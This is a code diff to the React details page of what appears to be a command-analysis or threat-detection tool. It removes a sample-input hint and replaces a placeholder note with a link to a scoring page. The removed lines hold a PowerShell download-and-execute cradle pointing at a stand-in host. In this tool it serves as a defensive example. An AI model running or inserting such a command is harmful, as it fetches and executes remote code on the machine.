@@ -351,12 +351,7 @@ export default function AnalysisDetailsPage() {
             <LoadingSpinner />
           </div>
         )}
-        <InfoMessage 
-          message={!error && newCommand.trim() === "" ? "Example: IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')" : ""}
-          clickable={!error && newCommand.trim() === ""}
-          onClick={() => setNewCommand("IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')")}
-        />
-          </div>
+      </div>
           
       {rateLimitInfo && (
         <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mt-4 mb-6 rounded-lg border-2 bg-black/80 border-green-500/30">
@@ -584,9 +579,15 @@ export default function AnalysisDetailsPage() {
         <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
           <div className="border rounded-lg p-4 bg-black/80 border-green-500/30">
             <div className="font-mono text-sm" style={{color: 'var(--muted-foreground)'}}>
-              Matched indicators are not inherently suspicious but highlight traces that may require closer examination. For interpretation details, check the link below:
-              <br /><br />
-              <span style={{color: 'var(--primary-purple)'}}>&lt;wiki link to be provided later&gt;</span>
+              Matched indicators are not inherently suspicious but highlight traces that may require closer examination.{' '}
+              <a 
+                href="/info/scoring" 
+                target="_blank" 
+                rel="noopener noreferrer"
+                style={{color: 'var(--accent)', textDecoration: 'underline', cursor: 'pointer'}}
+              >
+                Learn more about scoring →
+              </a>
             </div>
           </div>
         </div>
